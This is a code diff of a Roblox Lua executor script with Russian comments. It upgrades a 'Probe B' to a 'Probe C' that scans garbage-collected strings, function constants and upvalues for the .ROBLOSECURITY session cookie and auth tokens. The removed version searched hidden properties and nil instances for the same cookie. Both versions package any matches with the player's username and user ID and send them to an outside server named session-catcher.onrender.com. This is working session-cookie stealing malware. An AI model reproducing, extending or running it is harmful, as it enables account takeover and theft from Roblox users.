@@ -1,5 +1,5 @@
 -- ============================================================
---  Probe B — gethiddenproperties + getproperties + getnilinstances
+--  Probe C — getgc/filtergc + getconstants + getupvalues
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -10,122 +10,189 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local hiddenPropertiesAll = {}
-local propertiesAll = {}
-local nilInstances = {}
+local gcMatches = {}
+local gcStringCount = 0
+local constants = {}
+local upvalues = {}
 
 -- -----------------------------------------------------------
--- 1. gethiddenproperties на всех сервисах
--- -----------------------------------------------------------
-local services = {
-    {"Players", game:GetService("Players")},
-    {"NetworkClient", game:GetService("NetworkClient")},
-    {"ReplicatedFirst", game:GetService("ReplicatedFirst")},
-    {"RbxAnalyticsService", game:GetService("RbxAnalyticsService")},
-    {"PlatformUserService", game:GetService("PlatformUserService")},
-    {"DataStoreService", game:GetService("DataStoreService")},
-    {"ScriptContext", game:GetService("ScriptContext")},
-    {"TeleportService", game:GetService("TeleportService")},
-    {"HttpService", game:GetService("HttpService")},
-    {"game", game},
-    {"LocalPlayer", LocalPlayer},
-}
-
-for _, pair in ipairs(services) do
-    local name = pair[1]
-    local svc = pair[2]
-    
-    -- gethiddenproperties (множественное)
-    pcall(function()
-        if gethiddenproperties then
-            local props = gethiddenproperties(svc)
-            if props and type(props) == "table" then
-                local dump = {}
-                for k, v in pairs(props) do
-                    dump[tostring(k)] = tostring(v):sub(1, 300)
-                end
-                hiddenPropertiesAll[name] = dump
-            else
-                hiddenPropertiesAll[name] = "empty or nil"
-            end
-        end
-    end)
-    task.wait(0.1)
-    
-    -- getproperties (множественное)
-    pcall(function()
-        if getproperties then
-            local props = getproperties(svc)
-            if props and type(props) == "table" then
-                local dump = {}
-                for k, v in pairs(props) do
-                    local vStr = tostring(v)
-                    -- Ищем куку
-                    if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
-                        dump[tostring(k)] = "COOKIE: " .. vStr:sub(1, 500)
-                    else
-                        dump[tostring(k)] = vStr:sub(1, 200)
-                    end
-                end
-                propertiesAll[name] = dump
-            end
-        end
-    end)
-    task.wait(0.1)
-end
-
--- -----------------------------------------------------------
--- 2. getnilinstances — ищем скрытые объекты
+-- 1. getgc / filtergc — скан всех строк
 -- -----------------------------------------------------------
 pcall(function()
-    if getnilinstances then
-        local instances = getnilinstances()
-        if instances then
-            for _, inst in ipairs(instances) do
-                local name = inst.Name or "?"
-                local className = inst.ClassName or "?"
-                local entry = name .. " (" .. className .. ")"
-                
-                -- Проверяем скрытые свойства
-                if gethiddenproperties then
-                    local ok, props = pcall(gethiddenproperties, inst)
-                    if ok and props then
-                        for k, v in pairs(props) do
-                            local vStr = tostring(v)
-                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") 
-                               or vStr:find("cookie") or vStr:find("token") then
-                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
+    if filtergc then
+        -- Получаем все строки из GC
+        local strings = filtergc("string")
+        if strings then
+            gcStringCount = #strings
+            for i, s in ipairs(strings) do
+                if type(s) == "string" then
+                    if s:find("_|WARNING") or s:find("ROBLOSECURITY") 
+                       or s:find("|_") or s:find("auth_token") then
+                        table.insert(gcMatches, "GC[" .. tostring(i) .. "]: " .. s:sub(1, 500))
+                    end
+                end
+            end
+        end
+    elseif getgc then
+        -- Fallback: getgc без фильтра
+        local objs = getgc()
+        if objs then
+            for i, obj in pairs(objs) do
+                if type(obj) == "string" then
+                    gcStringCount = gcStringCount + 1
+                    if obj:find("_|WARNING") or obj:find("ROBLOSECURITY") 
+                       or obj:find("|_") then
+                        table.insert(gcMatches, "GC[" .. tostring(i) .. "]: " .. obj:sub(1, 500))
+                    end
+                elseif type(obj) == "table" then
+                    -- Проверяем один уровень
+                    for k, v in pairs(obj) do
+                        if type(v) == "string" then
+                            gcStringCount = gcStringCount + 1
+                            if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
+                                table.insert(gcMatches, "GC_TBL[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
+                            end
+                        end
+                    end
+                elseif type(obj) == "function" then
+                    -- Проверяем upvalues функций
+                    if getupvalues then
+                        local ok, upvs = pcall(getupvalues, obj)
+                        if ok and upvs then
+                            for k, v in pairs(upvs) do
+                                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
+                                    table.insert(gcMatches, "GC_FUNC_UPVAL[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
+                                end
+                            end
+                        end
+                    end
+                    -- Проверяем константы функций
+                    if getconstants then
+                        local ok2, consts = pcall(getconstants, obj)
+                        if ok2 and consts then
+                            for k, v in pairs(consts) do
+                                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
+                                    table.insert(gcMatches, "GC_FUNC_CONST[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
+                                end
                             end
                         end
                     end
                 end
-                
-                -- Проверяем обычные свойства
-                if getproperties then
-                    local ok2, props2 = pcall(getproperties, inst)
-                    if ok2 and props2 then
-                        for k, v in pairs(props2) do
-                            local vStr = tostring(v)
-                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
-                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
-                            end
-                        end
-                    end
-                end
-                
-                table.insert(nilInstances, entry)
             end
         end
     end
 end)
 
+-- -----------------------------------------------------------
+-- 2. getconstants на HTTP функциях
+-- -----------------------------------------------------------
+pcall(function()
+    if getconstants then
+        -- request
+        local ok, consts = pcall(getconstants, request)
+        if ok and consts then
+            local dump = {}
+            for k, v in pairs(consts) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            constants["request"] = dump
+        else
+            constants["request"] = "ERR: " .. tostring(consts):sub(1, 100)
+        end
+    end
+end)
+
+pcall(function()
+    if getconstants and httpget then
+        local ok, consts = pcall(getconstants, httpget)
+        if ok and consts then
+            local dump = {}
+            for k, v in pairs(consts) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            constants["httpget"] = dump
+        end
+    end
+end)
+
+pcall(function()
+    if getconstants then
+        local ok, consts = pcall(getconstants, game.HttpGet)
+        if ok and consts then
+            local dump = {}
+            for k, v in pairs(consts) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            constants["game.HttpGet"] = dump
+        end
+    end
+end)
+
+pcall(function()
+    if getconstants and httppost then
+        local ok, consts = pcall(getconstants, httppost)
+        if ok and consts then
+            local dump = {}
+            for k, v in pairs(consts) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            constants["httppost"] = dump
+        end
+    end
+end)
+
+-- -----------------------------------------------------------
+-- 3. getupvalues на HTTP функциях
+-- -----------------------------------------------------------
+pcall(function()
+    if getupvalues then
+        local ok, upvs = pcall(getupvalues, request)
+        if ok and upvs then
+            local dump = {}
+            for k, v in pairs(upvs) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            upvalues["request"] = dump
+        else
+            upvalues["request"] = "ERR or empty"
+        end
+    end
+end)
+
+pcall(function()
+    if getupvalues and httpget then
+        local ok, upvs = pcall(getupvalues, httpget)
+        if ok and upvs then
+            local dump = {}
+            for k, v in pairs(upvs) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            upvalues["httpget"] = dump
+        end
+    end
+end)
+
+pcall(function()
+    if getupvalues then
+        local ok, upvs = pcall(getupvalues, game.HttpGet)
+        if ok and upvs then
+            local dump = {}
+            for k, v in pairs(upvs) do
+                dump[tostring(k)] = tostring(v):sub(1, 200)
+            end
+            upvalues["game.HttpGet"] = dump
+        end
+    end
+end)
+
 local payload = {
-    probe = "B — Hidden Props + Nil Instances",
+    probe = "C — GC Scan + Constants + Upvalues",
     username = LocalPlayer.Name,
     userId = LocalPlayer.UserId,
-    hiddenPropertiesAll = hiddenPropertiesAll,
-    propertiesAll = propertiesAll,
-    nilInstances = nilInstances,
+    gcMatches = gcMatches,
+    gcStringCount = gcStringCount,
+    constants = constants,
+    upvalues = upvalues,
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
 
@@ -138,4 +205,4 @@ pcall(function()
     })
 end)
 
-print("[Probe B] sent. Services: " .. #services .. " | Nil instances: " .. #nilInstances)
+print("[Probe C] sent. GC strings: " .. gcStringCount .. " | GC matches: " .. #gcMatches)
